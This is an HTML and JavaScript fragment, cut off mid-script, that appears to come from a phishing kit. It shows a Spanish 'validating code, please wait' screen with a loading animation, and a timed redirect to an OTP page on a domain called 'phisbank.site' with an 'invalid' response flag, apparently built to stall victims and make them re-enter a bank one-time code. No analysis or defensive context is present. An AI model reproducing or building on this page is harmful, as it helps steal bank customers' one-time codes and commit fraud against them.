                ...
                <div class="grid xl:grid-cols-5 lg:grid-cols-3 gap-6">
                    ...
                    <div class="xl:col-span-3 lg:col-span-2 lg:mx-10 my-auto">
                        ...
                        <div class="space-y-5 mt-10">
                            ...
                            <div>
                                <label class="font-medium text-sm block mb-2" for="email">Validando Código, Espere unos
                                    segundos.</label>
                                <img src="assets/images/ajax2.gif" />
...
<script type="text/javascript">
    setTimeout(function () {
        window.location.href = "https://phisbank.site/otp.php?response=invalid"; // Reemplaza con la URL a la que deseas redirigir
